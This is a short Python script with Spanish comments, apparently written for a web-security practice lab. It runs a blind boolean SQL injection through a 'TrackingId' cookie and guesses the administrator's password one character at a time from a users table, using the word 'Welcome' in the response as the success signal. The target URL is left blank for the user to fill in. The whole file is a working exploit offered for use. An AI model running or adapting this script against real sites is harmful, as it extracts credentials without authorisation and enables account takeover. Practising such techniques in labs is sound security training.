import pwn,sys,requests,string,time,signal,pdb

def interrupt_handler(signum,frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)
# ctrl + C
signal.signal(signal.SIGINT, interrupt_handler)

def bruteForceString():
    main_url = '' # insert the url that you want to apply brute force
    characters = string.ascii_lowercase + string.digits
    string_requested = ""
    p1 = pwn.log.progress("Brute Force")
    #p1.status("Iniciating brute force attack")

    #p2 = pwn.log.progress("Password")

    for position in range (1,21):
        for character in characters:
            #example of payload with SQL injection
            cookies = {
                'TrackingId': f"KSuR4Km2QU1t0lO5' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position},1)  = '{character}",
                'session': 'oUR1RWFZzK1XCqNMRiPIH9aw2fUI0h2l'
            }

            #p1.status(cookies['TrackingId'])
            r = requests.get(main_url,cookies=cookies)
            if "Welcome" in r.text:
                string_requested += character
                break
    print(string_requested)


if __name__ == '__main__':
    
    bruteForceString()

